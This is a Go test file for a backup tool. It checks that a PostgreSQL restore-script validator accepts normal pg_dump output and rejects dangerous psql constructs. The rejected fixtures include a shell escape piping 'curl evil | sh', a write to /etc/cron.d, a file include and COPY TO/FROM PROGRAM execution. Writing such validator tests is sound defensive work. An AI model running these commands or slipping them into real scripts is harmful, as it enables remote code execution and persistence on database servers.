package backup

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeScript(t *testing.T, body string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "restore.sql")
	if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestCheckRestoreScript(t *testing.T) {
	pgDumpLike := strings.Join([]string{
		`\restrict abc123`,
		`SET statement_timeout = 0;`,
		`COPY public.devices (id, name, notes) FROM stdin;`,
		`1	core	\N`,
		`\N	odd row starting with a backslash	x`,
		`\.`,
		`SELECT pg_catalog.setval('public.devices_id_seq', 1, true);`,
		`\unrestrict abc123`,
	}, "\n")

	tests := []struct {
		name    string
		body    string
		wantErr string
	}{
		{"pg_dump output is accepted", pgDumpLike, ""},
		{"shell escape", "SELECT 1;\n\\! curl evil | sh\n", `\!`},
		{"write file", "\\o /etc/cron.d/x\nSELECT 1;\n", `\o`},
		{"include another file", "\\i /tmp/other.sql\n", `\i`},
		{"copy to program", "COPY (SELECT 1) TO PROGRAM 'id';\n", "PROGRAM"},
		{"copy from program lowercase", "copy t from program 'id';\n", "PROGRAM"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := checkRestoreScript(writeScript(t, tt.body))
			if tt.wantErr == "" {
				if err != nil {
					t.Fatalf("unexpected rejection: %v", err)
				}
				return
			}
			if err == nil || !strings.Contains(err.Error(), tt.wantErr) {
				t.Fatalf("error = %v, want mention of %q", err, tt.wantErr)
			}
		})
	}
}

func TestDSNWithoutPassword(t *testing.T) {
	dsn := "postgres://nm:s3cret@db:5432/netmonitor?sslmode=disable"
	if got := dsnWithoutPassword(dsn); strings.Contains(got, "s3cret") {
		t.Fatalf("password left in DSN: %s", got)
	}
	found := false
	for _, kv := range pgEnv(dsn) {
		if kv == "PGPASSWORD=s3cret" {
			found = true
		}
	}
	if !found {
		t.Fatal("PGPASSWORD not set from DSN")
	}
}
